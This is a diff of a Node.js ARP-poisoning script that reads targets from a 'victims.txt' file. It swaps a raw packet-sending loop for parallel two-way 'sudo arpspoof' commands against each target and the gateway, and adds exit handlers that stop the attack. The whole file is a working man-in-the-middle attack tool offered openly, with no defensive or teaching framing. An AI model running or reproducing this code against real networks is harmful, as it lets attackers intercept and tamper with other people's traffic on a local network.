@@ -1,21 +1,24 @@
 const fs = require('fs');
-const arp = require('arpjs');
+const nrc = require('node-run-cmd');
 
 const IFACE = process.argv[2];
 const GATEWAY = process.argv[3];
-// const MYIP = process.argv[4];
+let MYMAC;
 const FILEPATH = './victims.txt';
 
 class Attack {
-  constructor(packetInterval) {
-    this.packetInterval = packetInterval || 1000; // recommended every 10 sec
+  constructor() {
+    this.packetInterval = 5000; // recommended every 10 sec
   }
 
   start() {
     if (!IFACE) {
       throw Error('include an interface');
     } else {
-      arp.setInterface(this.IFACE);
+      require('getmac').getMac({ iface: IFACE }, (err, macAddress) => {
+        if (err) throw err;
+        MYMAC = macAddress;
+      });
     }
     if (!GATEWAY) {
       throw Error('include a GATEWAY!');
@@ -29,29 +32,32 @@ class Attack {
     if (!this.targets.length) throw new Error('Gather(.sh) some victims!');
 
     this.stop();
-
-    this.runningAttack = setInterval(() => {
-      this.targets.forEach(target => {
-        console.log('telling', GATEWAY, 'that', target, 'is fake');
-        arp.send({
-          op: 'reply',
-          src_ip: GATEWAY,
-          dst_ip: target,
-          dst_mac: 'ff:ff:ff:ff:ff:ff',
-        });
-      });
-    }, this.packetInterval);
-  }
-
-  pause(ms) {
-    this.stop();
-    setTimeout(this.start, ms || 5000);
+    const commands = [];
+    this.targets.forEach(target => {
+      console.log('poisoning', `${IFACE} ${GATEWAY} ${target}`);
+      commands.push(`sudo arpspoof -i ${IFACE} -t ${GATEWAY} ${target}`);
+      commands.push(`sudo arpspoof -i ${IFACE} -t ${target} ${GATEWAY}`);
+    });
+    nrc.run(commands, { mode: 'parallel' });
   }
 
   stop() {
-    clearInterval(this.runningAttack);
+    nrc.run('sudo killall arpspoof');
   }
 }
 
-const attack = new Attack(1000);
+const attack = new Attack();
 attack.start();
+
+process.stdin.resume(); // so the program will not close instantly
+
+function exitHandler() {
+  attack.stop();
+}
+
+// do something when app is closing
+process.on('exit', exitHandler);
+process.on('SIGINT', exitHandler);
+process.on('SIGUSR1', exitHandler);
+process.on('SIGUSR2', exitHandler);
+process.on('uncaughtException', exitHandler);
